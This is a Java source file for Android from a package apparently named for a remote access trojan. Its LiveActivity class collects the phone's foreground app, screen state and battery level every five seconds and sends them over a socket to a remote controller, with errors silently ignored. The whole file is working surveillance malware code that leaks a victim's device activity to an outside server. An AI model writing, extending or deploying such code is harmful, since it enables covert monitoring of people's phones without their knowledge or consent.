package com.r.rat;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.Context;
import android.os.PowerManager;
import io.socket.client.Socket;
import org.json.JSONObject;
import java.util.List;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
public class LiveActivity {
    private static ScheduledExecutorService s;
    public static void start(Context c, Socket sock) {
        if (s != null) return;
        s = Executors.newSingleThreadScheduledExecutor();
        s.scheduleAtFixedRate(() -> {
            try {
                JSONObject j = new JSONObject();
                j.put("foreground", foregroundApp(c));
                j.put("screen_on", isScreenOn(c));
                j.put("battery", battery(c));
                sock.emit("live", j);
            } catch (Exception ignored) {}
        }, 0, 5, TimeUnit.SECONDS);
    }
    public static void stop() { if (s != null) s.shutdownNow(); s = null; }
    private static String foregroundApp(Context c) {
        UsageStatsManager usm = (UsageStatsManager) c.getSystemService(Context.USAGE_STATS_SERVICE);
        long now = System.currentTimeMillis();
        List<UsageStats> list = usm.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, now - 60000, now);
        if (list == null || list.isEmpty()) return "?";
        UsageStats best = null; long t = 0;
        for (UsageStats u : list) if (u.getLastTimeUsed() > t) { t = u.getLastTimeUsed(); best = u; }
        return best == null ? "?" : best.getPackageName();
    }
    private static boolean isScreenOn(Context c) {
        PowerManager pm = (PowerManager) c.getSystemService(Context.POWER_SERVICE);
        return pm.isInteractive();
    }
    private static int battery(Context c) {
        android.content.IntentFilter f = new android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED);
        android.content.Intent i = c.registerReceiver(null, f);
        return i == null ? -1 : i.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
    }
}